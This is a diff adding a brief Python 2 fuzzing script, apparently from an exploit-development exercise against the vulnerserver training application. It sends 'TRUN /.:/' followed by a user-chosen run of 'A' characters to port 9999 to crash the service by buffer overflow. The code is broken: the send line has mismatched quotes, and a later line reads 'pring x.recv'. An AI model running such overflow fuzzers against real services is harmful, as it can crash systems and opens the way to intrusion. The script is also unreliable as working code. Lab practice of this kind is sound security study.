@@ -1,0 +1,26 @@
+#!/usr/bin/env python
+
+import socket
+
+#change to your vulnerserver machine's IP Address
+TCP_IP = '0.0.0.0'
+TCP_PORT = 9999
+
+#Take user input to define length of fuzz input
+#and put that in variable called length
+
+length = int(raw_input('Length of attack: '))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect((TCP_IP, TCP_PORT))
+print s.recv(1024)
+print "Seinding attack length ", length, 'to TRUN /.:/'
+
+attack = "A" * length
+
+s.send(("TRUN /.:/' + attack + '\r\n'))
+
+print s.recv(1024)
+s.send('EXIT\r\n')
+pring x.recv(1024)
+s.close()
